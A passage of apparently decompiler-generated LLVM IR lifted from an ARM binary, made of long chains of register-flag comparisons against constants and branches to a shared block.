  store i1 %v2_ed14, i1* %cpsr_c.global-to-local, align 1
  %v7_ed14 = icmp eq i32 %v1_e85c, 100
  store i1 %v7_ed14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed14, label %bb1470, label %.thread1149

.thread1149:                                      ; preds = %bb1469
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed34

bb1470:                                           ; preds = %bb1469
  %v2_ed1c = urem i32 %v0_ff0c, 2
  store i32 %v2_ed1c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed20 = icmp eq i32 %v2_ed1c, 0
  store i1 %v2_ed20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed20, label %dec_label_pc_ed34, label %dec_label_pc_ed2c

dec_label_pc_ed2c:                                ; preds = %bb1470
  %v2_ed2c = icmp ugt i32 %v1_e870, 125
  store i1 %v2_ed2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed2c = icmp eq i32 %v1_e870, 126
  store i1 %v7_ed2c, i1* %cpsr_z.global-to-local, align 1
  %v2_ed30 = xor i1 %v2_ed2c, true
  %v3_ed30 = or i1 %v7_ed2c, %v2_ed30
  br i1 %v3_ed30, label %dec_label_pc_e858, label %dec_label_pc_ed34

dec_label_pc_ed34:                                ; preds = %.thread1149, %dec_label_pc_ed2c, %bb1470
  %v7_ed34 = icmp eq i32 %v1_e85c, 169
  %.2003 = zext i1 %v7_ed34 to i32
  store i32 %.2003, i32* %r3.global-to-local, align 4
  %v2_ed40 = icmp ugt i32 %v1_e870, 253
  store i1 %v2_ed40, i1* %cpsr_c.global-to-local, align 1
  %v7_ed40 = icmp eq i32 %v1_e870, 254
  %storemerge1237 = zext i1 %v7_ed40 to i32
  %v2_ed4c = and i32 %storemerge1237, %.2003
  %v4_ed4c = icmp eq i32 %v2_ed4c, 0
  store i1 %v4_ed4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ed4c, label %dec_label_pc_ed5c, label %dec_label_pc_e858

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed34
  %v7_ed5c = icmp eq i32 %v1_e85c, 198
  %.2004 = zext i1 %v7_ed5c to i32
  store i32 %.2004, i32* %r3.global-to-local, align 4
  store i1 %v2_e924, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e924, i1* %cpsr_z.global-to-local, align 1
  %v2_ed70 = xor i1 %v2_e924, true
  %v3_ed70 = or i1 %v7_e924, %v2_ed70
  br i1 %v3_ed70, label %bb1477, label %bb1478

bb1477:                                           ; preds = %dec_label_pc_ed5c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1478

bb1478:                                           ; preds = %dec_label_pc_ed5c, %bb1477
  %v4_ed74 = phi i32 [ %.2004, %dec_label_pc_ed5c ], [ 0, %bb1477 ]
  %v2_ed74 = xor i1 %v7_e924, true
  %v3_ed74 = and i1 %v2_e924, %v2_ed74
  br i1 %v3_ed74, label %bb1479, label %thread-pre-split131

bb1479:                                           ; preds = %bb1478
  store i32 %v4_ed74, i32* %r3.global-to-local, align 4
  br label %thread-pre-split131

thread-pre-split131:                              ; preds = %bb1478, %bb1479
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed78 = icmp eq i32 %v4_ed74, 0
  store i1 %v2_ed78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed78, label %dec_label_pc_ed8c, label %dec_label_pc_ed84

dec_label_pc_ed84:                                ; preds = %thread-pre-split131
  %v2_ed84 = icmp ugt i32 %v1_e870, 18
  store i1 %v2_ed84, i1* %cpsr_c.global-to-local, align 1
  %v7_ed84 = icmp eq i32 %v1_e870, 19
  store i1 %v7_ed84, i1* %cpsr_z.global-to-local, align 1
  %v2_ed88 = xor i1 %v2_ed84, true
  %v3_ed88 = or i1 %v7_ed84, %v2_ed88
  br i1 %v3_ed88, label %dec_label_pc_e858, label %dec_label_pc_ed8c

dec_label_pc_ed8c:                                ; preds = %dec_label_pc_ed84, %thread-pre-split131
  store i32 %.2001, i32* %r3.global-to-local, align 4
  store i1 %v2_eb88, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eb88, i1* %cpsr_z.global-to-local, align 1
  %v2_ed94 = xor i1 %v2_eb88, true
  %v3_ed94 = or i1 %v7_eb88, %v2_ed94
  br i1 %v3_ed94, label %bb1480, label %bb1481

bb1480:                                           ; preds = %dec_label_pc_ed8c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1481

bb1481:                                           ; preds = %dec_label_pc_ed8c, %bb1480
  %v4_ed98 = phi i32 [ %.2001, %dec_label_pc_ed8c ], [ 0, %bb1480 ]
  %v2_ed98 = xor i1 %v7_eb88, true
  %v3_ed98 = and i1 %v2_eb88, %v2_ed98
  br i1 %v3_ed98, label %bb1482, label %thread-pre-split132

bb1482:                                           ; preds = %bb1481
  store i32 %v4_ed98, i32* %r3.global-to-local, align 4
  br label %thread-pre-split132

thread-pre-split132:                              ; preds = %bb1481, %bb1482
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed9c = icmp eq i32 %v4_ed98, 0
  store i1 %v2_ed9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed9c, label %dec_label_pc_edac, label %dec_label_pc_eda4

dec_label_pc_eda4:                                ; preds = %thread-pre-split132
  %v2_eda4 = icmp ugt i32 %v1_e870, 225
  store i1 %v2_eda4, i1* %cpsr_c.global-to-local, align 1
  %v7_eda4 = icmp eq i32 %v1_e870, 226
  store i1 %v7_eda4, i1* %cpsr_z.global-to-local, align 1
  %v2_eda8 = xor i1 %v2_eda4, true
  %v3_eda8 = or i1 %v7_eda4, %v2_eda8
  br i1 %v3_eda8, label %dec_label_pc_e858, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %dec_label_pc_eda4, %thread-pre-split132
  store i1 %v2_ebf4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebf4, i1* %cpsr_z.global-to-local, align 1
  %v2_edb0 = xor i1 %v2_ebf4, true
  %v3_edb0 = or i1 %v7_ebf4, %v2_edb0
  br i1 %v3_edb0, label %bb1483, label %bb1484

bb1483:                                           ; preds = %dec_label_pc_edac
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1484

bb1484:                                           ; preds = %dec_label_pc_edac, %bb1483
  %v0_edb8835 = phi i32 [ %v4_ed98, %dec_label_pc_edac ], [ 0, %bb1483 ]
  %v2_edb4 = xor i1 %v7_ebf4, true
  %v3_edb4 = and i1 %v2_ebf4, %v2_edb4
  br i1 %v3_edb4, label %bb1485, label %bb1486

bb1485:                                           ; preds = %bb1484
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1486

bb1486:                                           ; preds = %bb1484, %bb1485
  %v0_edb8 = phi i32 [ %v0_edb8835, %bb1484 ], [ 1, %bb1485 ]
  %v2_edbc = icmp ugt i32 %v1_e85c, 127
  store i1 %v2_edbc, i1* %cpsr_c.global-to-local, align 1
  %v7_edbc = icmp eq i32 %v1_e85c, 128
  store i1 %v7_edbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edbc, label %.thread133, label %.thread134

.thread134:                                       ; preds = %bb1486
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_edd8

.thread133:                                       ; preds = %bb1486
  %v2_edc4 = urem i32 %v0_edb8, 2
  store i32 %v2_edc4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edc8 = icmp eq i32 %v2_edc4, 0
  store i1 %v2_edc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edc8, label %dec_label_pc_edd8, label %dec_label_pc_edd0

dec_label_pc_edd0:                                ; preds = %.thread133
  %v2_edd0 = icmp ugt i32 %v1_e870, 235
  store i1 %v2_edd0, i1* %cpsr_c.global-to-local, align 1
  %v7_edd0 = icmp eq i32 %v1_e870, 236
  store i1 %v7_edd0, i1* %cpsr_z.global-to-local, align 1
  %v2_edd4 = xor i1 %v2_edd0, true
  %v3_edd4 = or i1 %v7_edd0, %v2_edd4
  br i1 %v3_edd4, label %dec_label_pc_e858, label %dec_label_pc_edd8

dec_label_pc_edd8:                                ; preds = %.thread134, %dec_label_pc_edd0, %.thread133
  %v7_edd8 = icmp eq i32 %v1_e85c, 129
  %.2005 = zext i1 %v7_edd8 to i32
  store i32 %.2005, i32* %r3.global-to-local, align 4
  %v2_ede4 = icmp ugt i32 %v1_e870, 20
  store i1 %v2_ede4, i1* %cpsr_c.global-to-local, align 1
  %v7_ede4 = icmp eq i32 %v1_e870, 21
  store i1 %v7_ede4, i1* %cpsr_z.global-to-local, align 1
  %v2_ede8 = xor i1 %v2_ede4, true
  %v3_ede8 = or i1 %v7_ede4, %v2_ede8
  br i1 %v3_ede8, label %.thread139, label %bb1489

.thread139:                                       ; preds = %dec_label_pc_edd8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_edfc

bb1489:                                           ; preds = %dec_label_pc_edd8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edec = icmp eq i1 %v7_edd8, false
  store i1 %v2_edec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edec, label %dec_label_pc_edfc, label %dec_label_pc_edf4

dec_label_pc_edf4:                                ; preds = %bb1489
  %v2_edf4 = icmp eq i32 %v1_e870, 255
  store i1 %v2_edf4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_edf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edf4, label %dec_label_pc_edfc, label %dec_label_pc_e858

dec_label_pc_edfc:                                ; preds = %.thread139, %dec_label_pc_edf4, %bb1489
  %v7_edfc = icmp eq i32 %v1_e85c, 130
  %.2006 = zext i1 %v7_edfc to i32
  store i32 %.2006, i32* %r3.global-to-local, align 4
  %v2_ee08 = icmp ugt i32 %v1_e870, 38
  store i1 %v2_ee08, i1* %cpsr_c.global-to-local, align 1
  %v7_ee08 = icmp eq i32 %v1_e870, 39
  store i1 %v7_ee08, i1* %cpsr_z.global-to-local, align 1
  %v2_ee0c = xor i1 %v2_ee08, true
  %v3_ee0c = or i1 %v7_ee08, %v2_ee0c
  br i1 %v3_ee0c, label %.thread144, label %bb1492

.thread144:                                       ; preds = %dec_label_pc_edfc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee20

bb1492:                                           ; preds = %dec_label_pc_edfc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee10 = icmp eq i1 %v7_edfc, false
  store i1 %v2_ee10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee10, label %dec_label_pc_ee20, label %dec_label_pc_ee18

dec_label_pc_ee18:                                ; preds = %bb1492
  %v2_ee18 = icmp ugt i32 %v1_e870, 166
  store i1 %v2_ee18, i1* %cpsr_c.global-to-local, align 1
  %v7_ee18 = icmp eq i32 %v1_e870, 167
  store i1 %v7_ee18, i1* %cpsr_z.global-to-local, align 1
  %v2_ee1c = xor i1 %v2_ee18, true
  %v3_ee1c = or i1 %v7_ee18, %v2_ee1c
  br i1 %v3_ee1c, label %dec_label_pc_e858, label %dec_label_pc_ee20

dec_label_pc_ee20:                                ; preds = %.thread144, %dec_label_pc_ee18, %bb1492
  %v2_ee20 = icmp ugt i32 %v1_e870, 1
  store i1 %v2_ee20, i1* %cpsr_c.global-to-local, align 1
  %v7_ee20 = icmp eq i32 %v1_e870, 2
  store i1 %v7_ee20, i1* %cpsr_z.global-to-local, align 1
  %v2_ee24 = xor i1 %v2_ee20, true
  %v3_ee24 = or i1 %v7_ee20, %v2_ee24
  br i1 %v3_ee24, label %bb1493, label %bb1494

bb1493:                                           ; preds = %dec_label_pc_ee20
  br label %bb1494

bb1494:                                           ; preds = %dec_label_pc_ee20, %bb1493
  %v1_ee34840 = phi i32 [ %.2004, %dec_label_pc_ee20 ], [ 0, %bb1493 ]
  %v2_ee28 = xor i1 %v7_ee20, true
  %v3_ee28 = and i1 %v2_ee20, %v2_ee28
  br i1 %v3_ee28, label %bb1495, label %bb1496

bb1495:                                           ; preds = %bb1494
  br label %bb1496

bb1496:                                           ; preds = %bb1494, %bb1495
  %v1_ee50 = phi i32 [ %v1_ee34840, %bb1494 ], [ 1, %bb1495 ]
  %v2_ee2c = icmp ugt i32 %v1_e85c, 130
  store i1 %v2_ee2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee2c = icmp eq i32 %v1_e85c, 131
  store i1 %v7_ee2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee2c, label %.thread147, label %.thread148

.thread148:                                       ; preds = %bb1496
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee48

.thread147:                                       ; preds = %bb1496
  %v2_ee34 = urem i32 %v1_ee50, 2
  store i32 %v2_ee34, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee38 = icmp eq i32 %v2_ee34, 0
  store i1 %v2_ee38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee38, label %dec_label_pc_ee48, label %dec_label_pc_ee40

dec_label_pc_ee40:                                ; preds = %.thread147
  %v2_ee40 = icmp ugt i32 %v1_e870, 249
  store i1 %v2_ee40, i1* %cpsr_c.global-to-local, align 1
  %v7_ee40 = icmp eq i32 %v1_e870, 250
  store i1 %v7_ee40, i1* %cpsr_z.global-to-local, align 1
  %v2_ee44 = xor i1 %v2_ee40, true
  %v3_ee44 = or i1 %v7_ee40, %v2_ee44
  br i1 %v3_ee44, label %dec_label_pc_e858, label %dec_label_pc_ee48

dec_label_pc_ee48:                                ; preds = %.thread148, %dec_label_pc_ee40, %.thread147
  %v2_ee48 = icmp ugt i32 %v1_e85c, 131
  store i1 %v2_ee48, i1* %cpsr_c.global-to-local, align 1
  %v7_ee48 = icmp eq i32 %v1_e85c, 132
  store i1 %v7_ee48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee48, label %.thread151, label %.thread152

.thread152:                                       ; preds = %dec_label_pc_ee48
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee64

.thread151:                                       ; preds = %dec_label_pc_ee48
  %v2_ee50 = urem i32 %v1_ee50, 2
  store i32 %v2_ee50, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee54 = icmp eq i32 %v2_ee50, 0
  store i1 %v2_ee54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee54, label %dec_label_pc_ee64, label %dec_label_pc_ee5c

dec_label_pc_ee5c:                                ; preds = %.thread151
  %v2_ee5c = icmp ugt i32 %v1_e870, 249
  store i1 %v2_ee5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee5c = icmp eq i32 %v1_e870, 250
  store i1 %v7_ee5c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee60 = xor i1 %v2_ee5c, true
  %v3_ee60 = or i1 %v7_ee5c, %v2_ee60
  br i1 %v3_ee60, label %dec_label_pc_e858, label %dec_label_pc_ee64

dec_label_pc_ee64:                                ; preds = %.thread152, %dec_label_pc_ee5c, %.thread151
  %v2_ee64 = icmp ugt i32 %v1_e870, 3
  store i1 %v2_ee64, i1* %cpsr_c.global-to-local, align 1
  %v7_ee64 = icmp eq i32 %v1_e870, 4
  store i1 %v7_ee64, i1* %cpsr_z.global-to-local, align 1
  %v2_ee68 = xor i1 %v2_ee64, true
  %v3_ee68 = or i1 %v7_ee64, %v2_ee68
  br i1 %v3_ee68, label %bb1497, label %bb1498

bb1497:                                           ; preds = %dec_label_pc_ee64
  br label %bb1498

bb1498:                                           ; preds = %dec_label_pc_ee64, %bb1497
  %v1_ee78842 = phi i32 [ %v1_ee50, %dec_label_pc_ee64 ], [ 0, %bb1497 ]
  %v2_ee6c = xor i1 %v7_ee64, true
  %v3_ee6c = and i1 %v2_ee64, %v2_ee6c
  br i1 %v3_ee6c, label %bb1499, label %bb1500

bb1499:                                           ; preds = %bb1498
  br label %bb1500

bb1500:                                           ; preds = %bb1498, %bb1499
  %v1_f090 = phi i32 [ %v1_ee78842, %bb1498 ], [ 1, %bb1499 ]
  %v2_ee70 = icmp ugt i32 %v1_e85c, 133
  store i1 %v2_ee70, i1* %cpsr_c.global-to-local, align 1
  %v7_ee70 = icmp eq i32 %v1_e85c, 134
  store i1 %v7_ee70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee70, label %.thread155, label %.thread156

.thread156:                                       ; preds = %bb1500
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee8c

.thread155:                                       ; preds = %bb1500
  %v2_ee78 = urem i32 %v1_f090, 2
  store i32 %v2_ee78, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee7c = icmp eq i32 %v2_ee78, 0
  store i1 %v2_ee7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee7c, label %dec_label_pc_ee8c, label %dec_label_pc_ee84

dec_label_pc_ee84:                                ; preds = %.thread155
  %v2_ee84 = icmp ugt i32 %v1_e870, 233
  store i1 %v2_ee84, i1* %cpsr_c.global-to-local, align 1
  %v7_ee84 = icmp eq i32 %v1_e870, 234
  store i1 %v7_ee84, i1* %cpsr_z.global-to-local, align 1
  %v2_ee88 = xor i1 %v2_ee84, true
  %v3_ee88 = or i1 %v7_ee84, %v2_ee88
  br i1 %v3_ee88, label %dec_label_pc_e858, label %dec_label_pc_ee8c

dec_label_pc_ee8c:                                ; preds = %.thread156, %dec_label_pc_ee84, %.thread155
  %v7_ee8c = icmp eq i32 %v1_e85c, 136
  %.2007 = zext i1 %v7_ee8c to i32
  store i32 %.2007, i32* %r3.global-to-local, align 4
  %v2_ee98 = icmp ugt i32 %v1_e870, 175
  store i1 %v2_ee98, i1* %cpsr_c.global-to-local, align 1
  %v7_ee98 = icmp eq i32 %v1_e870, 176
  store i1 %v7_ee98, i1* %cpsr_z.global-to-local, align 1
  %v2_ee9c = xor i1 %v2_ee98, true
  %v3_ee9c = or i1 %v7_ee98, %v2_ee9c
  br i1 %v3_ee9c, label %.thread161, label %bb1503

.thread161:                                       ; preds = %dec_label_pc_ee8c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eeb0

bb1503:                                           ; preds = %dec_label_pc_ee8c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eea0 = icmp eq i1 %v7_ee8c, false
  store i1 %v2_eea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eea0, label %dec_label_pc_eeb0, label %dec_label_pc_eea8

dec_label_pc_eea8:                                ; preds = %bb1503
  %v2_eea8 = icmp ugt i32 %v1_e870, 221
  store i1 %v2_eea8, i1* %cpsr_c.global-to-local, align 1
  %v7_eea8 = icmp eq i32 %v1_e870, 222
  store i1 %v7_eea8, i1* %cpsr_z.global-to-local, align 1
  %v2_eeac = xor i1 %v2_eea8, true
  %v3_eeac = or i1 %v7_eea8, %v2_eeac
  br i1 %v3_eeac, label %dec_label_pc_e858, label %dec_label_pc_eeb0

dec_label_pc_eeb0:                                ; preds = %.thread161, %dec_label_pc_eea8, %bb1503
  %v7_eeb0 = icmp eq i32 %v1_e85c, 138
  %.2008 = zext i1 %v7_eeb0 to i32
  store i32 %.2008, i32* %r3.global-to-local, align 4
  %v2_eec0 = icmp ugt i32 %v1_e870, 11
  store i1 %v2_eec0, i1* %cpsr_c.global-to-local, align 1
  %v7_eec0 = icmp eq i32 %v1_e870, 12
  store i1 %v7_eec0, i1* %cpsr_z.global-to-local, align 1
  %v2_eec4 = xor i1 %v2_eec0, true
  %v3_eec4 = or i1 %v7_eec0, %v2_eec4
  br i1 %v3_eec4, label %bb1506, label %bb1507

bb1506:                                           ; preds = %dec_label_pc_eeb0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1507

bb1507:                                           ; preds = %dec_label_pc_eeb0, %bb1506
  %v4_eec8 = phi i32 [ %.2008, %dec_label_pc_eeb0 ], [ 0, %bb1506 ]
  %v2_eec8 = xor i1 %v7_eec0, true
  %v3_eec8 = and i1 %v2_eec0, %v2_eec8
  br i1 %v3_eec8, label %bb1508, label %thread-pre-split165

bb1508:                                           ; preds = %bb1507
  store i32 %v4_eec8, i32* %r3.global-to-local, align 4
  br label %thread-pre-split165

thread-pre-split165:                              ; preds = %bb1507, %bb1508
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eecc = icmp eq i32 %v4_eec8, 0
  store i1 %v2_eecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eecc, label %dec_label_pc_eee0, label %dec_label_pc_eed8

dec_label_pc_eed8:                                ; preds = %thread-pre-split165
  %v2_eed8 = icmp ugt i32 %v1_e870, 192
  store i1 %v2_eed8, i1* %cpsr_c.global-to-local, align 1
  %v7_eed8 = icmp eq i32 %v1_e870, 193
  store i1 %v7_eed8, i1* %cpsr_z.global-to-local, align 1
  %v2_eedc = xor i1 %v2_eed8, true
  %v3_eedc = or i1 %v7_eed8, %v2_eedc
  br i1 %v3_eedc, label %dec_label_pc_e858, label %dec_label_pc_eee0

dec_label_pc_eee0:                                ; preds = %dec_label_pc_eed8, %thread-pre-split165
  %v7_eee0 = icmp eq i32 %v1_e85c, 139
  %.2009 = zext i1 %v7_eee0 to i32
  store i32 %.2009, i32* %r3.global-to-local, align 4
  store i1 %v2_ec1c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec1c, i1* %cpsr_z.global-to-local, align 1
  %v2_eef4 = xor i1 %v2_ec1c, true
  %v3_eef4 = or i1 %v7_ec1c, %v2_eef4
  br i1 %v3_eef4, label %bb1511, label %bb1512

bb1511:                                           ; preds = %dec_label_pc_eee0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1512

bb1512:                                           ; preds = %dec_label_pc_eee0, %bb1511
  %v4_eef8 = phi i32 [ %.2009, %dec_label_pc_eee0 ], [ 0, %bb1511 ]
  %v2_eef8 = xor i1 %v7_ec1c, true
  %v3_eef8 = and i1 %v2_ec1c, %v2_eef8
  br i1 %v3_eef8, label %bb1513, label %thread-pre-split167

bb1513:                                           ; preds = %bb1512
  store i32 %v4_eef8, i32* %r3.global-to-local, align 4
  br label %thread-pre-split167

thread-pre-split167:                              ; preds = %bb1512, %bb1513
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eefc = icmp eq i32 %v4_eef8, 0
  store i1 %v2_eefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eefc, label %dec_label_pc_ef0c, label %dec_label_pc_ef04

dec_label_pc_ef04:                                ; preds = %thread-pre-split167
  %v2_ef04 = icmp ugt i32 %v1_e870, 141
  store i1 %v2_ef04, i1* %cpsr_c.global-to-local, align 1
  %v7_ef04 = icmp eq i32 %v1_e870, 142
  store i1 %v7_ef04, i1* %cpsr_z.global-to-local, align 1
  %v2_ef08 = xor i1 %v2_ef04, true
  %v3_ef08 = or i1 %v7_ef04, %v2_ef08
  br i1 %v3_ef08, label %dec_label_pc_e858, label %dec_label_pc_ef0c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_ef04, %thread-pre-split167
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef0c = icmp eq i32 %v1_e870, 0
  store i1 %v2_ef0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef0c, label %bb1515, label %bb1514

bb1514:                                           ; preds = %dec_label_pc_ef0c
  br label %bb1515

bb1515:                                           ; preds = %dec_label_pc_ef0c, %bb1514
  %v0_fed0 = phi i32 [ 0, %dec_label_pc_ef0c ], [ 1, %bb1514 ]
  store i32 %v0_fed0, i32* %r3.global-to-local, align 4
  %v2_ef18 = icmp ugt i32 %v1_e85c, 139
  store i1 %v2_ef18, i1* %cpsr_c.global-to-local, align 1
  %v7_ef18 = icmp eq i32 %v1_e85c, 140
  store i1 %v7_ef18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef18, label %bb1516, label %.thread1151

.thread1151:                                      ; preds = %bb1515
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef38

bb1516:                                           ; preds = %bb1515
  store i32 %v0_fed0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef24 = icmp eq i32 %v0_fed0, 0
  store i1 %v2_ef24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef24, label %dec_label_pc_ef38, label %dec_label_pc_ef30

dec_label_pc_ef30:                                ; preds = %bb1516
  store i1 %v2_ea88, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ea88, i1* %cpsr_z.global-to-local, align 1
  %v2_ef34 = xor i1 %v2_ea88, true
  %v3_ef34 = or i1 %v7_ea88, %v2_ef34
  br i1 %v3_ef34, label %dec_label_pc_e858, label %dec_label_pc_ef38

dec_label_pc_ef38:                                ; preds = %.thread1151, %dec_label_pc_ef30, %bb1516
  %v0_ef241153 = phi i32 [ 0, %.thread1151 ], [ 1, %dec_label_pc_ef30 ], [ 0, %bb1516 ]
  store i1 %v2_eb78, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eb78, i1* %cpsr_z.global-to-local, align 1
  %v2_ef3c = xor i1 %v2_eb78, true
  %v3_ef3c = or i1 %v7_eb78, %v2_ef3c
  br i1 %v3_ef3c, label %bb1517, label %bb1518

bb1517:                                           ; preds = %dec_label_pc_ef38
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1518

bb1518:                                           ; preds = %dec_label_pc_ef38, %bb1517
  %v0_ef44851 = phi i32 [ %v0_ef241153, %dec_label_pc_ef38 ], [ 0, %bb1517 ]
  %v2_ef40 = xor i1 %v7_eb78, true
  %v3_ef40 = and i1 %v2_eb78, %v2_ef40
  br i1 %v3_ef40, label %bb1519, label %bb1520

bb1519:                                           ; preds = %bb1518
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1520

bb1520:                                           ; preds = %bb1518, %bb1519
  %v0_ef44 = phi i32 [ %v0_ef44851, %bb1518 ], [ 1, %bb1519 ]
  %v2_ef48 = icmp ugt i32 %v1_e85c, 142
  store i1 %v2_ef48, i1* %cpsr_c.global-to-local, align 1
  %v7_ef48 = icmp eq i32 %v1_e85c, 143
  store i1 %v7_ef48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef48, label %.thread169, label %.thread170

.thread170:                                       ; preds = %bb1520
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef64

.thread169:                                       ; preds = %bb1520
  %v2_ef50 = urem i32 %v0_ef44, 2
  store i32 %v2_ef50, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef54 = icmp eq i32 %v2_ef50, 0
  store i1 %v2_ef54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef54, label %dec_label_pc_ef64, label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %.thread169
  %v2_ef5c = icmp ugt i32 %v1_e870, 231
  store i1 %v2_ef5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef5c = icmp eq i32 %v1_e870, 232
  store i1 %v7_ef5c, i1* %cpsr_z.global-to-local, align 1
  %v2_ef60 = xor i1 %v2_ef5c, true
  %v3_ef60 = or i1 %v7_ef5c, %v2_ef60
  br i1 %v3_ef60, label %dec_label_pc_e858, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %.thread170, %dec_label_pc_ef5c, %.thread169
  %v7_ef64 = icmp eq i32 %v1_e85c, 144
  %.2010 = zext i1 %v7_ef64 to i32
  store i32 %.2010, i32* %r3.global-to-local, align 4
  store i1 %v2_e944, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e944, i1* %cpsr_z.global-to-local, align 1
  %v2_ef74 = xor i1 %v2_e944, true
  %v3_ef74 = or i1 %v7_e944, %v2_ef74
  br i1 %v3_ef74, label %.thread175, label %bb1523

.thread175:                                       ; preds = %dec_label_pc_ef64
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef88

bb1523:                                           ; preds = %dec_label_pc_ef64
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef78 = icmp eq i1 %v7_ef64, false
  store i1 %v2_ef78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef78, label %dec_label_pc_ef88, label %dec_label_pc_ef80

dec_label_pc_ef80:                                ; preds = %bb1523
  %v2_ef80 = icmp ugt i32 %v1_e870, 251
  store i1 %v2_ef80, i1* %cpsr_c.global-to-local, align 1
